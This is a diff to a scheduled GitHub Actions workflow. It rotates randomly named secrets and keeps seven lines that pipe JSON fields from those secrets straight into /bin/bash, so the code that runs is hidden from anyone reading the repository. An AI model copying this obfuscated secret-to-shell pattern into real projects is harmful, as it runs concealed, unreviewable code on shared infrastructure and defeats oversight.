@@ -2,23 +2,21 @@ name: hugouhuolong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
-
+    - cron: '30 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hugouhuolong
         env:
-          ofbo243: ${{ secrets.ofbo243 }}
+          lr34: ${{ secrets.lr34 }}
         run: |
-          echo $ofbo243 | jq -r .focaw049 | /bin/bash
-          echo $uq2167 | jq -r .jd4504 | /bin/bash
-          echo $yyz954 | jq -r .ucn39 | /bin/bash
-          echo $d21 | jq -r .befmt9256 | /bin/bash
-          echo $hng5418 | jq -r .u121 | /bin/bash
-          echo $tr9774 | jq -r .kq1714 | /bin/bash
-          echo $p074 | jq -r .dvtc90 | /bin/bash
+          echo $lr34 | jq -r .vhgcc69 | /bin/bash
+          echo $vq422 | jq -r .xyjz4 | /bin/bash
+          echo $cy5 | jq -r .h8 | /bin/bash
+          echo $m875 | jq -r .eptm01600 | /bin/bash
+          echo $ch1470 | jq -r .e497 | /bin/bash
+          echo $qrhsp79 | jq -r .e92609 | /bin/bash
+          echo $tcw37 | jq -r .gw67675 | /bin/bash
 
